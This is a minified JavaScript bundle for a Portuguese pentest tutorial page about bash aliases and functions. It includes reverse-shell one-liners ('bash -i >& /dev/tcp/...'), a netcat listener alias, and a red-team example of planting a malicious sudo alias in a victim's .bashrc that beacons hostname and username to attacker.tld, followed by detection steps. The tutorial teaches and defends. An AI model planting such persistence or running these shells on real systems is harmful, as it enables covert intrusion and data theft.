import{j as a}from"./index-Bd5otbF3.js";import{P as i}from"./PageContainer-BFcnvssG.js";import{A as o}from"./AlertBox-CL6YULjX.js";import{C as s}from"./CodeBlock-C2J-D4l6.js";import{C as l}from"./CommandTable-BxJEHhQ9.js";import{T as e,P as t}from"./PracticeBox-Pst8IaIf.js";function p(){return a.jsxs(i,{title:"Aliases e funções shell",subtitle:"Atalhos para comandos longos, funções com argumentos e como atacantes abusam disso para persistência.",difficulty:"iniciante",timeToRead:"12 min",children:[a.jsx("h2",{children:"O que é um alias"}),a.jsxs("p",{children:["Um ",a.jsx("strong",{children:"alias"})," é uma substituição textual: o shell troca o nome do alias pela expansão antes de executar. É a forma mais simples de criar atalhos pessoais para comandos que você digita o tempo todo."]}),a.jsx(e,{path:"~",lines:[{cmd:"alias ll='ls -lah --color=auto'",out:"(silencioso)",outType:"muted"},{cmd:"ll /tmp",out:`total 24K
drwxrwxrwt  6 root     root     180 abr  3 15:42 .
drwxr-xr-x 19 root     root    4.0K mar  1 09:11 ..
-rw-r--r--  1 ana ana  17 abr  3 15:42 nota.txt`,outType:"info"},{comment:"lista todos os aliases ativos",cmd:"alias | head -8",out:`alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -lah --color=auto'
alias ls='ls --color=auto'`,outType:"default"},{comment:"remover um alias",cmd:"unalias ll",out:"(silencioso)",outType:"muted"}]}),a.jsx("h2",{children:"Sintaxe e regras importantes"}),a.jsx(s,{language:"bash",title:"o bom, o ruim e o feio do alias",code:`# 1. SEM espaço em volta do = (senão vira comando!)
alias gs='git status'        # ✓
alias gs = 'git status'      # ✗ erro

# 2. Aspas simples não interpolam — preserva $var literalmente
alias whoami_at='echo $USER@$HOSTNAME'   # expande na HORA do uso
alias whoami_at="echo $USER@$HOSTNAME"   # expande NO MOMENTO da definição

# 3. Aliases NÃO aceitam argumentos no meio.
#    Para isso, use FUNÇÃO. Veja seção abaixo.

# 4. Aliases só são expandidos no INÍCIO de um comando (por padrão).
alias ll='ls -lah'
sudo ll                       # ✗ não expande dentro de sudo
alias sudo='sudo '            # ✓ truque: espaço final faz expandir o próximo

# 5. Para aliases também rodarem em scripts não-interativos:
shopt -s expand_aliases       # do contrário, scripts ignoram aliases`}),a.jsx("h2",{children:"Persistir aliases"}),a.jsxs("p",{children:["Aliases definidos com ",a.jsx("code",{children:"alias foo=..."})," só vivem durante a sessão. Para torná-los permanentes coloque em ",a.jsx("code",{children:"~/.bashrc"})," (ou",a.jsx("code",{children:" ~/.bash_aliases"}),", que o ",a.jsx("code",{children:"~/.bashrc"})," padrão do Debian/Kali já importa)."]}),a.jsx(e,{path:"~",lines:[{cmd:"grep -n bash_aliases ~/.bashrc",out:`116:if [ -f ~/.bash_aliases ]; then
117:    . ~/.bash_aliases
118:fi`,outType:"info"},{cmd:`cat > ~/.bash_aliases <<'EOF'
# Pentest aliases
alias ports='ss -tulnp'
alias myip='curl -s ifconfig.me; echo'
alias localip="hostname -I | awk '{print \\$1}'"
alias web='python3 -m http.server 80'
alias hist='history | tail -50'
alias gh='cd ~/tools && ls'
EOF`,out:"(silencioso)",outType:"muted"},{cmd:"source ~/.bashrc && alias | grep -E 'web|ports|myip'",out:`alias myip='curl -s ifconfig.me; echo'
alias ports='ss -tulnp'
alias web='python3 -m http.server 80'`,outType:"success"}]}),a.jsx("h2",{children:"Top 20 aliases para pentester"}),a.jsx(s,{language:"bash",title:"~/.bash_aliases — versão completa pentester",code:`# ===== navegação =====
alias ..='cd ..'
alias ...='cd ../..'
alias ll='ls -lah --color=auto'
alias la='ls -A'
alias l='ls -CF'
alias h='history | tail -30'

# ===== infos do sistema =====
alias myip='curl -s ifconfig.me; echo'
alias localip="hostname -I | awk '{print \\$1}'"
alias ports='ss -tulnp'
alias listening='ss -tlnp'
alias mem='free -h'
alias diskhog='du -sh * | sort -h'

# ===== rede e enumeração =====
alias nmapquick='sudo nmap -T4 -F'
alias nmapfull='sudo nmap -p- -sV -sC -T4'
alias web='python3 -m http.server 80'
alias web8='python3 -m http.server 8080'
alias smb='impacket-smbserver SHARE $(pwd) -smb2support'

# ===== cracking / wordlists =====
alias rockyou='/usr/share/wordlists/rockyou.txt'
alias seclists='cd /usr/share/seclists'

# ===== msf / shells =====
alias msf='msfconsole -q'
alias rev='echo "bash -i >& /dev/tcp/$(localip)/4444 0>&1 | base64"'
alias listen='nc -lvnp 4444'

# ===== git =====
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git log --oneline --graph -20'

# ===== quality of life =====
alias please='sudo $(fc -ln -1)'
alias copy='xclip -selection clipboard'
alias paste='xclip -selection clipboard -o'`}),a.jsx("h2",{children:"Funções shell — quando alias não dá conta"}),a.jsx("p",{children:"Funções aceitam argumentos, têm múltiplas linhas e podem ter lógica. Use sempre que precisar de algo mais que substituição literal."}),a.jsx(s,{language:"bash",title:"funções pentest mais usadas",code:`# Saber quem responde dentro da /24 (host discovery rápido)
sweep() {
  local net="\${1:-192.168.1}"
  for i in {1..254}; do
    (ping -c1 -W1 "$net.$i" &>/dev/null && echo "[+] $net.$i UP") &
  done
  wait
}
# uso:  sweep 10.10.10

# Extrair só URLs únicas de um arquivo (Burp logs, JS dumps, etc.)
urls() {
  grep -Eoi 'https?://[^"'"'"' <>]+' "$1" | sort -u
}

# Decodificar base64 de stdin sem ter que digitar 'echo "..." | base64 -d'
b64d() { base64 -d <<< "$1"; echo; }
b64e() { echo -n "$1" | base64; echo; }

# Reverse shell oneliner pronto, com seu IP atual
revshell() {
  local ip=$(hostname -I | awk '{print $1}')
  local port=\${1:-4444}
  echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo "Listener: nc -lvnp $port"
}

# mkdir + cd no mesmo movimento
mkcd() { mkdir -p "$1" && cd "$1"; }

# extrai praticamente qualquer compactado
extract() {
  case "$1" in
    *.tar.bz2)  tar xjf "$1"  ;;
    *.tar.gz)   tar xzf "$1"  ;;
    *.tar.xz)   tar xJf "$1"  ;;
    *.bz2)      bunzip2 "$1"  ;;
    *.gz)       gunzip "$1"   ;;
    *.zip)      unzip "$1"    ;;
    *.7z)       7z x "$1"     ;;
    *.rar)      unrar x "$1"  ;;
    *) echo "extract: formato não suportado: $1" ;;
  esac
}`}),a.jsx("h2",{children:"Investigando o que um nome é"}),a.jsx(l,{title:"type, command, builtin",variations:[{cmd:"type ls",desc:"Diz o que 'ls' É: alias, função, builtin, hash ou arquivo.",output:"ls é um alias para 'ls --color=auto'"},{cmd:"type -a ls",desc:"Mostra TODAS as resoluções (alias + arquivo + ...).",output:`ls é um alias para 'ls --color=auto'
ls é /usr/bin/ls
ls é /bin/ls`},{cmd:"type -t ls",desc:"Só o tipo (alias|builtin|file|function|keyword).",output:"alias"},{cmd:"command ls",desc:"Executa 'ls' IGNORANDO aliases e funções.",output:"Volta ao comportamento padrão."},{cmd:"builtin cd /tmp",desc:"Força o uso do builtin (não de uma função 'cd' que você definiu).",output:"Útil para evitar loops em funções."},{cmd:"\\ls",desc:"Backslash desliga o alias só uma vez.",output:"= command ls, mas mais curto."},{cmd:"which ls",desc:"Só procura no PATH (ignora aliases/funções).",output:"/usr/bin/ls"},{cmd:"declare -f sweep",desc:"Mostra o corpo de uma função.",output:`sweep ()
{
    local net="\${1:-192.168.1}";
    ...
}`}]}),a.jsx(e,{path:"~",lines:[{cmd:"type ll urls cd nonexistent",out:`ll é um alias para 'ls -lah --color=auto'
urls é uma função
urls ()
{
    grep -Eoi 'https?://[^"\\'\\' <>]+' "$1" | sort -u
}
cd é um builtin do shell
bash: type: nonexistent: não encontrado`,outType:"info"}]}),a.jsx("h2",{children:"Aliases como vetor de persistência (red team)"}),a.jsxs("p",{children:["Um truque clássico de pós-exploração é plantar um alias malicioso no",a.jsx("code",{children:" ~/.bashrc"})," da vítima. Quando ela executar o comando esperado, sua carga roda primeiro. É ",a.jsx("em",{children:"persistence"})," sem cron, sem systemd, sem nada que EDR genérico monitore."]}),a.jsx(s,{language:"bash",title:"exemplo educacional — plantar callback em sudo",code:`# Imagine que você comprometeu o user 'devops' que usa sudo várias vezes ao dia.
# Você adiciona ao .bashrc DELE:

cat >> /home/devops/.bashrc <<'EOF'

# parece config inocente
alias sudo='/tmp/.cache/x; sudo'
EOF

# E em /tmp/.cache/x:
cat > /tmp/.cache/x <<'EOF'
#!/bin/bash
curl -s http://attacker.tld/beacon?h=$(hostname)\\&u=$(whoami) >/dev/null 2>&1
EOF
chmod +x /tmp/.cache/x

# Toda vez que o devops digitar 'sudo algo', o beacon dispara e DEPOIS o sudo
# real continua, sem nenhum sinal visível.`}),a.jsx(o,{type:"danger",title:"Em pentest legal, sempre limpe",children:"Esse padrão deve aparecer no relatório com instruções claras de remoção (linhas adicionadas, arquivos plantados). Em engagement real, NUNCA esqueça de remover — é a diferença entre red team profissional e crime."}),a.jsx("h2",{children:"Checagem defensiva: detectar aliases maliciosos"}),a.jsx(e,{path:"~",lines:[{comment:"audit completo dos arquivos shell do usuário",cmd:"grep -nE '^(alias|function)' ~/.bashrc ~/.bash_aliases ~/.zshrc 2>/dev/null",out:`/home/devops/.bashrc:140:alias sudo='/tmp/.cache/x; sudo'
/home/devops/.bashrc:142:alias ls='ls --color=auto'`,outType:"warning"},{comment:"diff contra um baseline limpo (de outro host idêntico)",cmd:"diff /baseline/.bashrc ~/.bashrc",out:`139a140
> alias sudo='/tmp/.cache/x; sudo'`,outType:"error"}]}),a.jsx(t,{title:"Crie 5 aliases pentest e uma função 'mkcd'",goal:"Construir um ~/.bash_aliases pessoal já útil pro dia a dia.",steps:["Crie ~/.bash_aliases com 5 aliases (myip, ports, web, ll, listen).","Adicione a função mkcd no final.","Source no .bashrc atual.","Teste 'mkcd /tmp/teste123' — deve criar e entrar no diretório."],command:`cat > ~/.bash_aliases <<'EOF'
alias myip='curl -s ifconfig.me; echo'
alias ports='ss -tulnp'
alias web='python3 -m http.server 80'
alias ll='ls -lah --color=auto'
alias listen='nc -lvnp 4444'

mkcd() { mkdir -p "$1" && cd "$1"; }
EOF
source ~/.bashrc
mkcd /tmp/teste123
pwd
type myip`,expected:`/tmp/teste123
myip é um alias para 'curl -s ifconfig.me; echo'`,verify:"O pwd retorna /tmp/teste123 (provando que mkcd entrou no dir) e type confirma que o alias está ativo."}),a.jsxs(o,{type:"info",title:"Zsh (default em Kali Purple) é compatível",children:["Toda a sintaxe acima funciona igual em Zsh. O equivalente do ",a.jsx("code",{children:"~/.bashrc"}),"é o ",a.jsx("code",{children:"~/.zshrc"}),", e em vez de ",a.jsx("code",{children:"shopt -s expand_aliases"})," use",a.jsx("code",{children:" setopt aliases"}),"."]})]})}export{p as default};
